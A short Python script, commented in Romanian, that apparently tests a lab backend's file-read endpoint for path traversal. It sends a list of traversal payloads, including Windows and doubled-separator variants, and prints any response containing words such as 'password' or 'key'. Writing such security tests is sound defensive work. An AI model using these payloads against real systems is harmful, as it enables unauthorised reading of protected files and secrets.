import requests

# 🔗 Endpoint-ul vulnerabil pentru citirea fișierelor
PATH_TRAVERSAL_URL = "http://backend:8080/api/files/read"

# 🛠 Lista de payload-uri pentru atacul Path Traversal
PAYLOADS = [
    "../supersecretfolder/supersecretfile",
    "..\\supersecretfolder\\supersecretfile",  # Variante pentru Windows
    "..//supersecretfolder//supersecretfile",
    "..\\\\supersecretfolder\\\\supersecretfile",
    "../../supersecretfolder/supersecretfile",
    "../../../supersecretfolder/supersecretfile",
]

# 📌 Cuvinte cheie sensibile pe care le căutăm în răspuns
SENSITIVE_KEYWORDS = [
    "secret", "password", "key", "config", "admin", "database"
]

def test_path_traversal():
    print("[🔍] Testare Path Traversal...")

    for payload in PAYLOADS:
        print(f"[*] Testăm payload-ul: {payload}")
        response = requests.post(PATH_TRAVERSAL_URL, json={"path": payload})

        if response.status_code == 200:
            data = response.text  # Răspunsul serverului

            # Verificăm dacă răspunsul conține termeni sensibili
            if any(keyword in data.lower() for keyword in SENSITIVE_KEYWORDS):
                print(f"[✔] Path Traversal Reușit! Am accesat:\n{data[:500]}...\n")
                return  # Dacă a reușit, oprim testul
            else:
                print(f"[✖] Fișier accesat, dar fără date sensibile:\n{data[:500]}...\n")
        else:
            print(f"[❌] Cererea a eșuat ({response.status_code}) pentru {payload}")

    print("[🔥] Testarea Path Traversal s-a încheiat.")

if __name__ == "__main__":
    test_path_traversal()
